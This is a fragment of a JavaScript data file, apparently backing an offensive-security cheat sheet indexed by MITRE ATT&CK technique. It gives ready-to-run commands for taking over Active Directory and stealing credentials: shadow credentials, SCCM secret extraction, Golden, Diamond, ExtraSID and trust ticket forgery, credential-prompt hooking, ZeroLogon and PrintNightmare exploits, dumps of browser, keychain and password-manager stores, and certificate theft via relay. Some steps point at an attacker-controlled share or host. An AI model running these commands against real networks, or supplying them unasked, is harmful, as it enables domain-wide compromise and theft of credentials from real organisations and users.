      tags: ["pywhisker", "Whisker", "shadow credentials", "T1556"],
      steps: [
        "Add shadow credential with pywhisker (Linux):\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target targetuser --action add\n# Adds a Key Credential to targetuser's msDS-KeyCredentialLink\n# Returns: PFX file + password for the generated certificate\n# Requires: GenericWrite / AllExtendedRights on target user/computer",
        "Add shadow credential with Whisker (Windows):\n$ Whisker.exe add /target:targetuser /domain:domain.com /dc:DC_IP\n# Output: Rubeus command to use the resulting certificate\n# The certificate can authenticate as targetuser via PKINIT",
        "Get TGT using shadow credential certificate:\n$ certipy auth -pfx targetuser.pfx -dc-ip DC_IP -domain domain.com\n# PKINIT authentication with the shadow credential cert\n# Returns: TGT AND NT hash (UnPAC-the-Hash)\n$ getTGTpkinit.py -cert-pfx targetuser.pfx -pfx-pass PASSWORD domain.com/targetuser@DC_IP",
        "Use NT hash obtained via UnPAC-the-Hash:\n# certipy auth returns NT hash even without knowing the password\n$ nxc smb 192.168.1.100 -u targetuser -H NT_HASH\n$ evil-winrm -i 192.168.1.100 -u targetuser -H NT_HASH\n# Full account takeover without password reset",
        "Shadow credentials on computer accounts:\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target 'DC01$' --action add\n# If you have write on a computer account (e.g., via RBCD write rights)\n# Get TGT as the machine account → extract machine hash → DCSync if DA"
      ]
    },
    {
      name: "SCCM Credential Extraction",
      id: "T1552.SCCM",
      summary: "NAA credentials • task sequences • PXE boot • DPAPI SCCM",
      description: "Extract credentials from SCCM Network Access Accounts, task sequences, and PXE boot configurations",
      tags: ["SCCM", "NAA", "PXE", "task sequence", "T1552"],
      steps: [
        "Extract Network Access Account (NAA) credentials:\n$ SharpSCCM.exe local naa\n$ python3 sccmhunter.py smb -u user -p pass -d domain.com -dc DC_IP -naa\n# NAA stored encrypted in WMI: root\\ccm\\policy\\Machine\\RequestedConfig\n# Encrypted with DPAPI using machine account key\n# Often a domain account with read access to file shares",
        "Extract NAA from WMI directly:\n$ Get-WmiObject -Namespace 'root\\ccm\\policy\\Machine\\RequestedConfig' -Class CCM_NetworkAccessAccount\n# Returns encrypted XML blobs\n$ python3 SystemDPAPI.py -u admin -p pass domain.com 192.168.1.100\n# Decrypt with machine DPAPI key via SYSTEM-level access",
        "Task sequence credential extraction:\n# Task sequences may contain 'Run Command Line' steps with embedded creds\n# Request task sequence policy over HTTPS or HTTP (if fallback enabled)\n$ python3 sccmhunter.py http -u user -p pass -d domain.com -dc DC_IP\n# Unauthenticated if HTTP allowed: retrieve full task sequence XML\n# Parse XML for <variable name='OSDJoinPassword'> and similar",
        "PXE boot credential attack:\n$ python3 pxethief.py 1 192.168.1.0/24\n# SCCM PXE: serves OS images over network\n# If PXE is password-protected: offline crack the password\n# If not: download task sequence media and extract embedded creds\n$ python3 pxethief.py 2 pxe_variable_file.txt",
        "Use extracted SCCM credentials:\n# NAA account → enumerate file shares across domain\n# NAA with write access → plant payloads on shares\n# SCCM admin account → deploy applications to all managed machines\n$ nxc smb 192.168.1.0/24 -u 'naa_account' -p 'NAAPassword' --shares"
      ]
    },
    {
      name: "Golden Ticket",
      id: "T1558.001",
      summary: "krbtgt hash • forged TGT • Mimikatz kerberos::golden",
      description: "Forge Kerberos TGTs using the krbtgt account hash to gain persistent domain-wide access as any user",
      tags: ["Golden Ticket", "krbtgt", "Mimikatz", "T1558"],
      steps: [
        "Extract krbtgt hash (requires DA):\n$ secretsdump.py domain/admin:pass@DC_IP -just-dc-user krbtgt\n$ Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:domain.com /user:krbtgt\"'\n# Get: krbtgt NTLM hash and AES keys\n# This is what makes the Golden Ticket valid",
        "Forge Golden Ticket with Mimikatz (Windows):\n# Golden Ticket = forged TGT signed with the krbtgt account's hash\n# The DC cannot distinguish it from a legitimate TGT\n# TGT default validity: 10 hours (real). Golden Ticket: forge as 10 years — no expiry\n$ mimikatz.exe 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_NTLM_HASH /id:500 /groups:512 /ptt'\n# /ptt: inject ticket directly into current logon session (immediately usable)\n# /id:500: RID of built-in Administrator (required for admin context)\n# /groups:512: Domain Admins RID — include in PAC (must be present for DA access)\n# /user: can be ANY name — even completely fake users work since DC trusts the krbtgt signature",
        "Forge Golden Ticket with ticketer.py (Linux):\n$ ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID -domain domain.com Administrator\n$ export KRB5CCNAME=Administrator.ccache\n$ psexec.py -k -no-pass domain.com/Administrator@DC.domain.com\n# Full domain admin access from Linux",
        "Golden Ticket with AES key (stealthier):\n$ ticketer.py -aesKey AES256_KRBTGT_KEY -domain-sid S-1-5-21-SID -domain domain.com Administrator\n# AES-encrypted TGT less suspicious than RC4\n# Less likely to trigger Kerberos encryption downgrade alerts",
        "Golden Ticket persistence:\n# Default validity: 10 years (no expiry concerns)\n# Survives password resets (only krbtgt rotation invalidates)\n# Golden Ticket invalid only after TWO krbtgt password rotations\n# Mitigation: rotate krbtgt twice with 10-hour gap between rotations"
      ]
    },
    {
      name: "Diamond Ticket",
      id: "T1558.diamond",
      summary: "Modify legit TGT PAC • Rubeus • diamondticket",
      description: "Modify the PAC of a legitimately-obtained TGT to add privileged group memberships, evading Golden Ticket detection",
      tags: ["Diamond Ticket", "PAC", "Rubeus", "T1558"],
      steps: [
        "Diamond Ticket with Rubeus (Windows):\n$ Rubeus.exe diamond /tgtdeleg /ticketuser:lowpriv /ticketuserid:1234 /groups:512\n# /tgtdeleg: use delegation to get a usable TGT\n# Requests a real TGT for lowpriv user, then modifies PAC\n# Adds group 512 (Domain Admins) to PAC",
        "Diamond Ticket with ticketer.py (Linux):\n$ ticketer.py -request -nthash KRBTGT_HASH -domain-sid S-1-5-21-SID -domain domain.com -user lowpriv -groups 512,519 lowpriv\n# -request: requests a real TGT first, then patches PAC\n# More realistic TGT than pure Golden Ticket\n# Harder to detect: ticket has valid KDC signature metadata",
        "Why Diamond Ticket evades detection:\n# Golden Ticket: ticket NOT issued by DC (no logon event)\n# Diamond Ticket: real TGT + modified PAC\n# DC issued the base ticket → appears in event logs\n# PAC modification adds privileges not in original token\n# Bypasses alerts that look for tickets not originating from DC",
        "Diamond vs Golden Ticket comparison:\n# Golden: offline forge, no DC interaction, krbtgt hash only\n# Diamond: requires TGT request (DC interaction), modifies existing TGT\n# Diamond: harder to detect, more realistic timestamps and metadata\n# Both: require krbtgt hash or AES key",
        "Use Diamond Ticket:\n$ export KRB5CCNAME=lowpriv.ccache\n$ secretsdump.py -k -no-pass domain.com/lowpriv@DC.domain.com\n$ psexec.py -k -no-pass domain.com/lowpriv@TARGET.domain.com\n# Behaves like Golden Ticket but with better stealth profile"
      ]
    },
    {
      name: "ExtraSID Attack",
      id: "T1134.ExtraSID",
      summary: "Golden + -519 • Enterprise Admins • inter-forest SID history",
      description: "Inject Enterprise Admin SIDs into a Golden Ticket to escalate from child domain to forest root",
      tags: ["ExtraSID", "SID history", "Enterprise Admins", "T1134"],
      steps: [
        "ExtraSID attack from child to parent domain:\n$ secretsdump.py child.domain.com/admin:pass@CHILD_DC -just-dc-user krbtgt\n# Get child domain krbtgt hash\n# Get forest root domain SID:\n$ Get-ADDomain forest.root.com | Select DomainSID",
        "Forge Golden Ticket with ExtraSID (Mimikatz):\n$ mimikatz.exe 'kerberos::golden /user:Administrator /domain:child.domain.com /sid:S-1-5-21-CHILD-SID /krbtgt:CHILD_KRBTGT_HASH /sids:S-1-5-21-FOREST-SID-519 /ptt'\n# /sids: injects Enterprise Admins (519) SID from forest root\n# Ticket valid in child domain but PAC contains forest-root EA SID",
        "Forge with ticketer.py (Linux):\n$ ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid S-1-5-21-CHILD-SID -domain child.domain.com -extra-sid S-1-5-21-FOREST-ROOT-SID-519 Administrator\n$ export KRB5CCNAME=Administrator.ccache\n$ psexec.py -k -no-pass forest.root.com/Administrator@FOREST_ROOT_DC",
        "Verify forest trust SID filtering is disabled:\n$ netdom trust child.domain.com /domain:forest.root.com /quarantine\n# If SID filtering (quarantine) is enabled: ExtraSID is blocked\n# Parent-child trusts within same forest: SID filtering disabled by default\n# External trusts: SID filtering enabled by default",
        "Complete child-to-forest compromise chain:\n# 1. Compromise any account in child domain\n# 2. Escalate to DA in child domain\n# 3. Extract child domain krbtgt hash\n# 4. Forge Golden Ticket + ExtraSID (519) for forest root\n# 5. Access forest root DC as Enterprise Admin\n# 6. Extract forest root krbtgt → Golden Ticket for entire forest"
      ]
    },
    {
      name: "Input Capture - Credential API Hooking",
      id: "T1056.004",
      summary: "CredUIPromptForWindowsCredentials • SSPI hooking • credential dialog intercept",
      description: "Hook Windows credential API calls to capture authentication dialogs and credentials",
      tags: ["API hooking", "credential dialog", "SSPI", "T1056"],
      steps: [
        "Hook CredUIPromptForWindowsCredentials:\n> // Hook the credential prompt API\n> [DllImport(\"credui.dll\")]\n> static extern uint CredUIPromptForWindowsCredentials(...);\n> // Detour the function to also log credentials before forwarding\n> DetourTransactionBegin();\n> DetourUpdateThread(GetCurrentThread());\n> DetourAttach(ref (IntPtr)originalCredUI, hookedCredUI);\n> DetourTransactionCommit();\n# Captures all Windows credential prompts",
        "Fake network authentication prompt:\n> [DllImport(\"credui.dll\")]\n> extern static bool CredUIPromptForCredentials(...);\n> // Invoke credential dialog with fake server name\n> string user = \"\", pass = \"\";\n> CredUIPromptForCredentials(\"legitimate-server\", credInfo, null, 0, user, 100, pass, 100, ref save, CREDUI_FLAGS_ALWAYS_SHOW_UI);\n# Pops 'Windows Security' prompt asking for credentials",
        "SSPI authentication interception:\n> // Hook SSPI AcquireCredentialsHandle and InitializeSecurityContext\n> // Intercept NTLM/Kerberos authentication in real-time\n> // Log plaintext credentials before they're hashed\n# Requires kernel driver or privileged process injection",
        "Fake MFA prompt injection:\n# Inject fake MFA prompt into legitimate app via process injection\n# Capture OTP code user enters\n# Forward to real service to appear transparent",
        "Logon Provider DLL (credential capture at logon):\n$ reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\malicious' /v DllName /d C:\\Windows\\System32\\malicious.dll /f\n# DLL loaded at every Windows logon\n# Capture credentials from logon process"
      ]
    },
    {
      name: "Exploitation for Credential Access",
      id: "T1212",
      summary: "Kerberos CVE • LSASS exploit • credential store CVE • browser vuln",
      description: "Exploit software vulnerabilities to extract credentials from protected storage",
      tags: ["Kerberos CVE", "LSASS exploit", "credential store", "T1212"],
      steps: [
        "MS14-068 - Kerberos privilege escalation:\n$ python2 goldenpac.py domain.com/user:pass@DC_IP administrator\n# Creates forged PAC claiming Domain Admin membership\n# Patched but unpatched DCs still exist\n$ nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.com' DC_IP",
        "ZeroLogon (CVE-2020-1472) credential access:\n$ python3 cve-2020-1472-exploit.py DC_NAME DC_IP\n# Exploit Netlogon authentication to set DC password to empty\n$ secretsdump.py -no-pass -just-dc domain/DC_NAME$@DC_IP\n# Immediate dump of all domain hashes",
        "PrintNightmare credential relay:\n$ rpcdump.py @DC_IP | grep 'IRemoteWinspool'\n$ python3 CVE-2021-1675.py domain/user:pass@DC_IP '\\\\attacker\\share\\evil.dll'\n# SYSTEM-level code execution → dump LSASS",
        "Spectre/Meltdown memory disclosure:\n# CPU speculative execution side-channel\n# Read arbitrary process memory including credential stores\n# Patched but kernel exploits still emerge\n# Relevant in shared cloud/VM environments",
        "Browser password store exploit:\n# Exploit browser vulnerability to read password store\n# Chrome: exploit renderer, escalate to read DPAPI-encrypted passwords\n# Firefox: exploit to read key4.db without user permission\n# Usually requires code execution in browser context"
      ]
    },
    {
      name: "Credentials from Password Stores",
      id: "T1555",
      summary: "Password manager • Windows Credential Manager • macOS Keychain • browser vaults",
      description: "Extract credentials from password managers and operating system credential stores",
      tags: ["password manager", "Credential Manager", "Keychain", "T1555"],
      steps: [
        "Windows Credential Manager dump:\n$ cmdkey /list\n$ vaultcmd /list\n# List all stored credentials\n$ Invoke-Mimikatz -Command '\"vault::list\"'\n$ SharpDPAPI.exe vaults\n# Decrypt vault credentials using DPAPI\n$ credentialfileview.exe /stext creds.txt\n# NirSoft tool: dumps all stored Windows credentials",
        "KeePass database attack:\n# Find KeePass files:\n$ find / -name '*.kdbx' 2>/dev/null\n# Brute-force master password offline:\n$ keepass2john target.kdbx > keepass.hash\n$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt\n# CVE-2023-32784: dump cleartext master password from KeePass memory:\n$ dotnet run --project PoC-2023-32784/keepass-dump-masterkey lsass.dmp\n# Or: process memory dump of running KeePass process",
        "macOS Keychain extraction:\n$ security find-generic-password -ga 'Safari'\n$ security dump-keychain -d login.keychain > keychain_dump.txt\n# Dumps all keychain entries if user is logged in\n$ python3 chainbreaker.py --password 'user_password' login.keychain\n# Chainbreaker: offline keychain analysis tool\n$ osascript -e 'tell application \"Keychain Access\" to get password of first internet password of keychain \"login\" whose account is \"user\"'",
        "Browser password store extraction:\n# Chrome/Edge — DPAPI encrypted:\n$ python3 HackBrowserData.py -b chrome -f password\n$ python3 chrome-password-dumper.py  # via hack-browser-data\n# Firefox — NSS encrypted:\n$ python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE\n# Database location: key4.db + logins.json\n# Uses NSS library to decrypt",
        "1Password vault cracking:\n# 1Password uses PBKDF2-HMAC-SHA256 (Master Password Equivalent)\n$ john 1password.hash --wordlist=rockyou.txt\n# Requires: encrypted vault + account key\n# More practical: access via logged-in browser extension\n$ python3 1password-decrypt.py  # community tool for offline vault analysis\n# Or attach debugger to running 1Password process and dump memory regions"
      ]
    },
    {
      name: "Steal or Forge Authentication Certificates",
      id: "T1649",
      summary: "PKINIT • certificate theft • ESC attacks • Kerberos cert auth",
      description: "Steal or forge X.509 certificates to authenticate as users and services via PKINIT",
      tags: ["certificate theft", "PKINIT", "ADCS", "T1649"],
      steps: [
        "Export user certificates from Windows certificate store:\n$ certutil -exportpfx -privatekey -user My user@domain.com user_cert.pfx\n$ python3 certipy cert -pfx user_cert.pfx -password 'export_pass' -nokey\n# Export user's certificate with private key\n# Requires access to user's certificate store (user-level)",
        "Steal machine certificate:\n$ SharpDPAPI.exe certificates /machine\n$ certutil -exportpfx -privatekey MY 'machine.domain.com' machine_cert.pfx\n# Machine certificate: authenticate as workstation/server\n# Stored in LocalMachine certificate store",
        "Extract certificate from LSA Secrets:\n$ secretsdump.py domain/admin:pass@192.168.1.100 -just-dc\n# DPAPI protected certificates stored in NTDS\n$ dpapi.py backupkeys -t domain.com/admin:pass@DC_IP --export\n# Domain DPAPI backup key decrypts any certificate",
        "Use stolen certificate for PKINIT auth:\n$ certipy auth -pfx stolen.pfx -dc-ip DC_IP -domain domain.com\n# Authenticates via Kerberos PKINIT using stolen cert\n# Returns: TGT + NT hash (UnPAC-the-Hash)\n# Works even after password change — cert independent",
        "Request DC certificate via ESC8 relay:\n$ ntlmrelayx.py -t http://ADCS/certsrv/certfnsh.asp --adcs --template DomainController\n$ python3 PetitPotam.py ATTACKER_IP DC_IP\n# Obtain DC certificate via NTLM relay\n# Use cert to get DC TGT → DCSync\n# Most impactful: domain controller certificate"
      ]
    },
    {
      name: "Trust Ticket (Inter-Realm TGT)",
      id: "T1558.trust",
      summary: "Trust key • inter-realm TGT • cross-forest • lateral movement",
      description: "Forge inter-realm TGTs using the domain trust key to move laterally across domain trust boundaries",
      tags: ["Trust Ticket", "inter-realm TGT", "trust key", "T1558"],
      steps: [
        "Extract the inter-domain trust key:\n$ secretsdump.py domain/admin:pass@DC_IP -just-dc-user 'TRUSTING_DOMAIN$'\n# Trust account stores the shared secret used for cross-domain auth\n# Format: TRUSTED_DOMAIN$ in the trusting domain\n$ Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:domain.com /user:TRUSTED_DOMAIN$\"'",
        "Forge a trust ticket (referral TGT) with Mimikatz:\n$ mimikatz.exe 'kerberos::golden /user:Administrator /domain:source.domain.com /sid:S-1-5-21-SOURCE-SID /rc4:TRUST_KEY_NTLM /service:krbtgt /target:target.domain.com /ptt'\n# /service:krbtgt /target: makes it a cross-realm referral\n# DC in target.domain.com will issue a TGS based on this referral",
        "Forge trust ticket with ticketer.py:\n$ ticketer.py -nthash TRUST_KEY_NTLM -domain-sid S-1-5-21-SOURCE-SID -domain source.domain.com -spn krbtgt/target.domain.com Administrator\n$ export KRB5CCNAME=Administrator.ccache\n$ getST.py -k -no-pass -spn cifs/TARGET_DC.target.domain.com target.domain.com/Administrator",
        "Access resources in the trusted domain:\n$ secretsdump.py -k -no-pass target.domain.com/Administrator@TARGET_DC.target.domain.com\n$ psexec.py -k -no-pass target.domain.com/Administrator@TARGET_DC.target.domain.com\n# Full DA-equivalent access in target domain\n# Requires: trust key + SID filtering to be disabled or bypassable",
        "Trust ticket vs Golden Ticket:\n# Golden Ticket: forges TGT within the same domain\n# Trust Ticket: forges cross-realm referral TGT between two domains\n# Trust tickets cross domain/forest boundaries\n# Requires: inter-domain trust key (stored as computer account secret)\n# More targeted: only works toward the specific trusted domain"
      ]
    }
  ]
};